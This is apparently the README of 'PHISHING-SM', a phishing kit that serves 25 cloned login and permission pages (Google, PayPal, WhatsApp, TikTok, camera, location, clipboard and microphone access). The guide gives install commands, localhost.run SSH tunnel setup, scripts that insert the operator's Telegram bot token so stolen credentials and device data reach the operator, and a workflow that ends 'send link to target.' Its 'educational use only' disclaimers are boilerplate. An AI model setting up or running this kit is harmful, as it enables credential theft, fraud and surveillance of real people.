# PHISHING-SM
PHISHING-SM Tool - Complete Guide

آلقيـــــــــآدهہ‌‏ آلزعيـــم ♕

📖 Introduction

PHISHING-SM is a professional Python-based tool designed for penetration testing and educational purposes. The tool creates professional phishing pages to collect credentials and device information.

⚠️ Important Warning: This tool is for educational purposes and authorized security testing only. Any unauthorized use is illegal.

🎯 Features

· ✅ Multiple professional phishing pages (25 different pages)
· ✅ Telegram bot integration for automatic results delivery
· ✅ SSH tunneling with localhost.run for public access
· ✅ Built-in PHP server with multiple port support
· ✅ QR code generation for quick access
· ✅ Process management and automatic cleanup
· ✅ Colored and user-friendly interface
· ✅ Automatic dependency checking and installation

📋 Requirements

System Requirements

· Python 3.7+
· PHP 7.4+
· OpenSSH Client
· Linux or macOS system (supports Windows with WSL)

Dependencies

```bash
# Ubuntu/Debian
sudo apt update && sudo apt install php ssh curl qrencode tmux

# CentOS/RHEL
sudo yum install php ssh curl qrencode tmux

# macOS
brew install php openssh curl qrencode tmux
```

🚀 Installation

1. Download the Tool

```bash
git clone https://github.com/MohamedAbuAl-Saud/PHISHING-SM.git
cd PHISHING-SM
pip install -r requirements
```

2. Verify Files

```bash
ls -la
# You should see PHP files and SM.py file
```

3. Make File Executable (Optional)

```bash
chmod +x SM.py
```

4. Run the Tool

```bash
python3 SM.py
```

📱 Termux Installation (Android)

1. Install Termux

Download Termux from F-Droid or Google Play Store

2. Update and Install Dependencies

```bash
pkg update && pkg upgrade
pkg install python php openssh curl git -y
```

3. Install Required Python Packages

```bash
pip install requests
```

4. Clone and Run

```bash
git clone https://github.com/MohamedAbuAl-Saud/PHISHING-SM.git
cd PHISHING-SM
python3 SM.py
```

5. Termux Specific Notes

· Some features like QR code generation may not work
· Use Termux in landscape mode for better experience
· Grant storage permissions if needed: termux-setup-storage

🔐 SSH Key Setup for localhost.run

1. Generate SSH Key (if not exists)

```bash
# Generate new SSH key
ssh-keygen -t rsa -b 4096 -f id_rsa -N ""

# Or use existing key if you have one
```

2. Manual SSH Tunnel Testing

```bash
# Basic test without key
ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 nokey@localhost.run

# With SSH key (recommended)
ssh -i id_rsa -o StrictHostKeyChecking=no -R 80:localhost:8080 ssh.localhost.run
```

3. Persistent SSH Setup

```bash
# Add to ~/.ssh/config
Host lhr
    HostName ssh.localhost.run
    RemoteForward 80 localhost:8080
    ServerAliveInterval 60
    IdentityFile ~/.ssh/id_rsa
```

4. Verify SSH Key

```bash
# Check if key exists
ls -la id_rsa

# Test connection
ssh -i id_rsa -o StrictHostKeyChecking=no -R 80:localhost:8080 ssh.localhost.run
```

🔧 Token Management System

Understanding Token Replacement

The tool automatically searches for the placeholder BBOTTTTTTTTTTT in all PHP files and replaces it with your actual bot token.

Manual Token Replacement

Method 1: Using sed (Linux/macOS)

```bash
# Replace token in all PHP files
sed -i 's/BBOTTTTTTTTTTT/YOUR_ACTUAL_TOKEN_HERE/g' *.php

# Verify replacement
grep -r "YOUR_ACTUAL_TOKEN_HERE" *.php
```

Method 2: Using Python Script

```python
import os
import re

def replace_token(new_token):
    php_files = [f for f in os.listdir('.') if f.endswith('.php')]
    for php_file in php_files:
        with open(php_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        if 'BBOTTTTTTTTTTT' in content:
            content = content.replace('BBOTTTTTTTTTTT', new_token)
            
            with open(php_file, 'w', encoding='utf-8') as f:
                f.write(content)
            print(f"Updated: {php_file}")

# Usage
replace_token("123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789")
```

Method 3: Using the Tool's Built-in Function

The tool automatically handles token replacement when you:

1. Enter your bot token
2. Select a phishing page
3. Start the services

Token Troubleshooting

Problem: Token not working after replacement

Solutions:

1. Check token format: Must be like 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789
2. Verify bot is active: Send /start to your bot
3. Check PHP files: Ensure token was replaced correctly
4. Manual verification:

```bash
grep -r "YOUR_TOKEN" *.php
```

Problem: "BBOTTTTTTTTTTT" not found in files

Solutions:

1. Check current directory: Make sure you're in the right folder
2. List PHP files: ls *.php
3. Verify file contents: grep -r "BBOTTTTTTTTTTT" *.php

Problem: Token reversion issues

Solutions:

1. Manual cleanup:

```bash
# Revert all tokens to placeholder
sed -i 's/YOUR_TOKEN/BBOTTTTTTTTTTT/g' *.php
```

1. Restore from backup: If you have backup files
2. Redownload: Clone the repository again

🛠️ Complete Troubleshooting Guide

Common Errors and Solutions

1. Token Related Errors

```
[-] Invalid bot token format!
```

Solution: Verify token format: 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789

2. PHP Server Errors

```
[-] No available ports found
```

Solution: The tool automatically tries different ports (8080, 8081, 8082, etc.)

3. SSH Tunnel Failures

```
[-] Could not establish SSH tunnel
```

Solutions:

· Check internet connection
· Try running tool again
· Verify port 22 is open
· Test manual SSH connection:

```bash
ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 nokey@localhost.run
```

4. Missing PHP Files

```
[-] No PHP files found in current directory!
```

Solution: Ensure you're in the correct directory containing PHP files

5. Dependency Issues

```
[-] Failed to install dependencies
```

Solution: Install dependencies manually according to your system

Manual Dependency Installation

For Ubuntu/Debian:

```bash
sudo apt update
sudo apt install python3 php openssh-client curl qrencode tmux
```

For CentOS/RHEL:

```bash
sudo yum update
sudo yum install python3 php openssh-clients curl qrencode tmux
```

For macOS:

```bash
brew install python3 php openssh curl qrencode tmux
```

For Termux (Android):

```bash
pkg update && pkg upgrade
pkg install python php openssh curl git -y
pip install requests
```

🔄 Complete Workflow

1. Initial Setup

· Dependency checking
· PHP files verification
· Token configuration

2. Service Startup

· PHP server startup
· SSH tunnel creation
· Final URL generation

3. Execution

· Send link to target
· Monitor results via Telegram
· Session management

4. Termination

· Stop services
· Cleanup files
· Restore settings

📁 File Structure

```
PHISHING-SM/
├── SM.py                          # Main tool file
├── *.php                         # Phishing pages (25 pages)
├── README.md                     # This documentation file
└── requirements.txt              # Requirements file (if exists)
```

🎮 Available Phishing Pages

No. Page Name Description
1 amazon.php Amazon login page
2 camera.php Camera access request
3 collection.php Device information collection
4 copy.php Clipboard content access
5 discord.php Discord login page
6 facebookg.php Facebook login page
7 freefire.php Freefire game login
8 github.php GitHub login page
9 google.php Google login page
10 instagram.php Instagram login page
11 location.php Location access request
12 microsoft.php Microsoft login page
13 netflix.php Netflix login page
14 paypal.php PayPal login page
15 peace.php PES game login
16 pupgmobile.php PUBG Mobile login
17 record.php Audio recording access
18 roblox.php Roblox game login
19 snab.php Snab app phishing
20 spotify.php Spotify login page
21 telegram.php Telegram login page
22 tiktok.php TikTok login page
23 whatsapp.php WhatsApp login page
24 x.php X (Twitter) login page
25 yallalido.php Yalla Lido phishing

🔧 Usage Instructions

Basic Operation

```bash
python3 SM.py
```

Detailed Steps:

1. Enter Bot Token: Input your Telegram bot token
2. Enter User ID: Input your Telegram user ID
3. Select Page: Choose page number (1-25)
4. Wait for Setup: The tool automatically:
   · Starts PHP server
   · Creates SSH tunnel
   · Generates phishing link
   · Creates QR code

Control Panel Commands:

· q: Stop services and exit
· t: Enter TMUX session (if available)
· r: Refresh status
· u: Show current URL
· l: Show logs (without TMUX)
· s: Show service status
· b: Return to main menu

🔒 Security and Cleanup

The tool automatically:

· Stops all services on exit
· Deletes temporary files
· Restores original token in PHP files
· Kills all related processes

Manual Cleanup:

```bash
# Stop all PHP and SSH processes
pkill -f 'php -S'
pkill -f 'ssh.*localhost.run'

# Delete temporary files
rm -f current_tunnel.url generated_url.txt php_server.log
```

📄 Rights and Responsibility

Developer Rights

· Developer: Mohamed Abu Al-Saud
· Channel: https://t.me/cybersecurityTemDF
· Rights: All rights reserved to the developer

Disclaimer

```
This tool is provided for educational purposes and authorized penetration testing only.
The developer is not responsible for any illegal or unauthorized use.
The tool should only be used on systems you own or have explicit permission to test.
Compliance with local laws and regulations is mandatory.
```

🌟 Advanced Features

1. Process Management

· Automatic tracking of all processes
· Smart cleanup on exit
· State recovery after interruption

2. Secure Token System

· Automatic token replacement in all files
· Original token restoration on exit
· Token validation before use

3. Advanced SSH Tunneling

· TMUX support for persistent sessions
· Detailed error logs
· Automatic reconnection

4. Professional UI

· Professional colors and formatting
· Perfect text alignment
· Progress bars and animations

📞 Support and Contact

· Developer: Mohamed Abu Al-Saud
· Channel: https://t.me/cybersecurityTemDF
· Repository: https://github.com/MohamedAbuAl-Saud/PHISHING-SM.git

🆘 Quick Help

Quick Commands:

```bash
# Run the tool
python3 SM.py

# Check dependencies
python3 SM.py --check-deps

# Help
python3 SM.py --help
```

Exit Codes:

· 0: Success
· 1: General error
· 2: Missing dependencies
· 3: Token error
· 4: Network error

---

⚠️ Final Warning

This tool is for legal and ethical purposes only:

· Authorized penetration testing
· Security research
· Educational purposes
· Testing your own systems

Prohibited uses include:

· Illegal activities
· Fraud or theft
· Privacy violation
· Any unethical purpose

---

Developed by: Mohamed Abu Al-Saud
All rights reserved © 2024

---

🔄 Token Replacement Technical Details

How Token Replacement Works

1. Search Phase: The tool scans all PHP files for the placeholder BBOTTTTTTTTTTT
2. Replacement Phase: Replaces all instances with your actual bot token
3. Verification Phase: Checks if replacement was successful
4. Cleanup Phase: Restores placeholder when tool exits

Manual Token Management Commands

```bash
# Check if placeholder exists
grep -r "BBOTTTTTTTTTTT" *.php

# Replace token manually
for file in *.php; do
    sed -i 's/BBOTTTTTTTTTTT/YOUR_ACTUAL_TOKEN/g' "$file"
done

# Verify replacement
grep -r "YOUR_ACTUAL_TOKEN" *.php

# Revert to placeholder
for file in *.php; do
    sed -i 's/YOUR_ACTUAL_TOKEN/BBOTTTTTTTTTTT/g' "$file"
done
```

Troubleshooting Token Issues

If you encounter token-related problems:

1. First: Check if your bot is active with @BotFather
2. Second: Verify token format is correct
3. Third: Manually check token replacement in PHP files
4. Fourth: Use the manual commands above to fix issues

Remember: The token BBOTTTTTTTTTTT is the placeholder that gets replaced with your actual Telegram bot token in all PHP files automatically by the tool

Quick Help: Quick Commands: ```bash # Run the tool python3 SM.py # Check dependencies python3 SM.py --check-deps # Help python3 SM.py --help``` 

Exit Codes: · 0: Success · 1: General Error · 2: Missing dependencies · 3: Token error · 4: Network error --- Final Warning: This tool is intended only for legal and ethical purposes: · Authorized penetration testing · Security research · Educational purposes · Testing your own systems. It is prohibited to use it for any of the following: · Illegal activities · Fraud or theft · Violation of others' privacy · Any unethical purpose --- Developed by: Mohamed Abu Al-Saud. All rights reserved 2025 
